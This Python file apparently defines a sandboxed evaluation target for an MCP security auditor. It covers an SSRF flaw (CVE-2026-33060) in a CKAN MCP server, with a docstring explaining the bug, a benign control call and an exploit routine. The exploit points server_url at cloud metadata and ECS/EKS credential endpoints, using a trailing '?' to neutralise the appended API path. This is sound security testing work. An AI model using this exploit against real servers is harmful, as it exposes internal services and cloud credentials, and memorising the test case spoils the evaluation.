"""CVE-2026-33060: @aborruso/ckan-mcp-server server-side request forgery (CWE-918).

Every CKAN tool funnels its caller-supplied server_url through makeCkanRequest
(src/utils/http.ts), which fetches `${server_url}/api/3/action/<action>` and, when the body
is not a CKAN `success:true` envelope, throws `CKAN API returned success=false:
${JSON.stringify(body)}`, echoing the whole fetched body into the MCP tool response. In the
affected range (< 0.4.85, here 0.4.83) makeCkanRequest performs no SSRF check, so a
caller-chosen internal / link-local address (cloud metadata, ECS / EKS credential endpoints)
is requested and its body surfaces: reach = internal_fetch. validateServerUrl is wired into
makeCkanRequest only in 0.4.84 and into the SPARQL path in 0.4.85 (the first version the
advisory marks patched), which rejects a private / link-local server_url before any fetch.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import ssrf_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

# The exploit aims a CKAN tool at an internal / link-local address; the benign public-portal
# call (https://demo.ckan.org) does not match it.
AIM = re.compile(r"://(?:10\.|127\.|169\.254\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)")

# A single makeCkanRequest behind it (one of the three tools the advisory names), so the
# fetched URL and the surfaced body are unambiguous.
EXPLOIT_TOOL = "ckan_datastore_search_sql"

KEPT_PLACES: tuple[str, ...] = ("imds", "ecs-task-credentials", "eks-pod-identity")


def _ssrf_base_url(places: Places, place_id: str) -> str:
    # Terminate server_url with `?` so makeCkanRequest's appended `/api/3/action/<action>`
    # becomes a query string busybox httpd ignores, leaving the request path equal to the
    # planted coordinate path.
    coordinates = places[place_id].coordinates
    return f"http://{coordinates.host}{coordinates.path}?"


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        await client.call_tool(
            EXPLOIT_TOOL, {"server_url": _ssrf_base_url(places, place_id), "sql": "SELECT 1"}
        )

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # A legitimate CKAN status check against a real public portal: a valid https host with no
    # internal address, admitted on both versions, surfaces no nonce and is not aimed.
    await client.call_tool("ckan_status_show", {"server_url": "https://demo.ckan.org"})


TARGET = CVETarget(
    cve_id="CVE-2026-33060",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanism=MechanismClass.INTERNAL_FETCH,
    aim=AIM,
    reaches=frozenset({"internal_fetch"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-33060-ckan", "sentinel"),
    server_image="holdout-2026-33060-ckan",
    patched_image="holdout-2026-33060-ckan-patched",
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED, working_directory="/srv", has_network=True
    ),
    builder=ssrf_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "SSRF (CWE-918): every CKAN tool fetches its caller-supplied server_url through "
        "makeCkanRequest with no destination check, so a link-local / cloud-metadata address "
        "is fetched and its body echoed in the success=false error."
    ),
    tools_filter=None,
)
